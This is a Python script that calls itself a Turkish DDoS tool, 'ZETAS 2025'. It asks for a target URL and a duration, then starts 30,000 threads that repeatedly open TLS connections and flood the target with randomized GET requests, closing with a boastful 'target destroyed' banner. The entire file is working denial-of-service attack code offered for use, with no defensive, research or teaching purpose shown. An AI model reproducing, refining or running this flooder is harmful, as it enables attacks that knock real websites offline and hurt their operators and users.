import os, socket, ssl, random, threading, time
os.system("cls & mode 140,40 & title ZETAS 2025 - DÜNYA YANIYOR")

print("\033[91m" + "█"*140)
print("""

███████╗███████╗████████╗ █████╗ ███████╗
╚══███╔╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝
  ███╔╝ █████╗     ██║   ███████║███████╗
 ███╔╝  ██╔══╝     ██║   ██╔══██║╚════██║
███████╗███████╗   ██║   ██║  ██║███████║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝

          2025 - EN GÜÇLÜ TÜRK DDOS ARACI
               KİMSE DURDURAMAZ
""".center(140))
print("█"*140 + "\033[0m")

hedef = input("\n\033[93m[*] Hedefi yaz lan (https:// ile): \033[0m").strip()
süre  = int(input("\033[93m[*] Kaç saniye vursun: \033[0m") or "300")

print(f"\n\033[91m[!] ZETAS ŞU AN {hedef} ÜSTÜNE YÜRÜYOR → {süre} saniye!\033[0m")
time.sleep(2)
print("\033[91m[!] 30.000 ASKER HAZIR! ATEŞ BAŞLIYOR...\033[0m")
time.sleep(2)

from urllib.parse import urlparse
u = urlparse(hedef if "://" in hedef else "https://" + hedef)
host = u.hostname
port = u.port or 443
path = u.path or "/"

def ateş():
    paket = f"GET {path}?q={random.randint(1,999999)} HTTP/2\r\nHost: {host}\r\nUser-Agent: ZETAS-2025\r\nConnection: keep-alive\r\n\r\n".encode()
    while time.time() < bitir:
        try:
            s = socket.create_connection((host, port))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
            for i in range(3000):
                s.send(paket)
            s.close()
        except:
            pass

bitir = time.time() + süre
for i in range(30000):  # 30.000 paralel bağlantı
    threading.Thread(target=ateş, daemon=True).start()

time.sleep(süre)
print("\n\033[91m" + "█"*140)
print("                   ZETAS İŞİ BİTTİ".center(140))
print("                 HEDEF YOK EDİLDİ".center(140))
print("█"*140 + "\033[0m")
os.system("pause >nul")